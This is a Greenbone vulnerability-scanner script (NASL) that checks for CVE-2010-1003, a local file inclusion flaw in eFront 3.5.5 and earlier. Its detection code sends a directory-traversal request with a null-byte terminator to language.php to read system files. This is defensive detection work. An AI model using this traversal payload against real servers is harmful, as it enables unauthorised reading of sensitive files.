# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:efrontlearning:efront";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100546");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-03-22 19:12:13 +0100 (Mon, 22 Mar 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-1003");
  script_name("eFront <= 3.5.5 'langname' Parameter LFI Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("secpod_efront_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efront/detected");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible.");

  script_tag(name:"affected", value:"eFront version 3.5.5 and prior.");

  script_tag(name:"solution", value:"Updates are available to address this issue. Please see the references
  for more information.");

  script_tag(name:"summary", value:"eFront is prone to a local file include (LFI) vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38787");
  script_xref(name:"URL", value:"http://www.coresecurity.com/content/efront-php-file-inclusion");
  script_xref(name:"URL", value:"http://forum.efrontlearning.net/viewtopic.php?f=15&t=1945");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/510155");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();
foreach file( keys( files ) ) {

  url = dir + "/editor/tiny_mce/langs/language.php?langname=a/../../../../../../../../../" + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
